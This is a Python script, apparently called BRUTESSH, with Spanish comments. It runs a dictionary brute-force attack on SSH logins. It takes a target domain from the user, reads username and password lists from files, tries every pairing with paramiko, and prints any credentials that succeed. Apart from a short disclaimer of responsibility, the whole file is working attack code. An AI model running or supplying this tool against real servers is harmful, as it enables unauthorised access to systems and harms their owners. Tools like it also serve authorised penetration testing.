import subprocess
import sys

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Verificar e instalar las bibliotecas necesarias
required_libraries = ["paramiko", "time"]

for lib in required_libraries:
    try:
        __import__(lib)
        print(f"Lib {lib} encontrada...")
    except ImportError:
        print(f"Lib {lib} no encontrada. Instalando...")
        install(lib)
        
import paramiko
from getpass import getpass
import time

# Banner con colores personalizados
BANNER = """

██████╗ ██████╗ ██╗   ██╗████████╗███████╗███████╗███████╗██╗  ██╗
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔════╝██╔════╝██║  ██║
██████╔╝██████╔╝██║   ██║   ██║   █████╗  ███████╗███████╗███████║
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ╚════██║╚════██║██╔══██║
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗███████║███████║██║  ██║
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
                                                                  
"""
WARNING = """
El autor de este script no se responsabiliza 
por cualquier uso indebido o ilegal de la herramienta.
"""

# Función para imprimir el banner con colores personalizados
def print_colored_banner(BANNER, WARNING):
    print("\033[1;31m" + BANNER + "\033[0m")
    # Blanco para el mensaje de advertencia
    print("\033[1;37m" + WARNING + "\033[0m")


def load_dictionary(file_path):
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print(f"Error: El archivo '{file_path}' no se encontró.")
        return []

def attempt_ssh_login(domain, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        client.connect(domain, username=username, password=password, timeout=10)
        print(f"¡Éxito! Usuario: {username}, Contraseña: {password}")
        client.close()
        return True
    except paramiko.AuthenticationException:
        print(f"Fallo")
    except paramiko.SSHException as e:
        print(f"Error SSH: {e}")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client.close()
    return False

def main():
    domain = input("Introduce el dominio objetivo (por ejemplo, example.com): ")
    user_list = load_dictionary('usernames.txt')
    pass_list = load_dictionary('passwords.txt')
    
    for username in user_list:
        for password in pass_list:
            if attempt_ssh_login(domain, username, password):
                return
            # Añadir un pequeño retraso entre intentos
            time.sleep(10)

if __name__ == "__main__":
    print_colored_banner(BANNER, WARNING)
    print("____________________________________________________________")
    main()
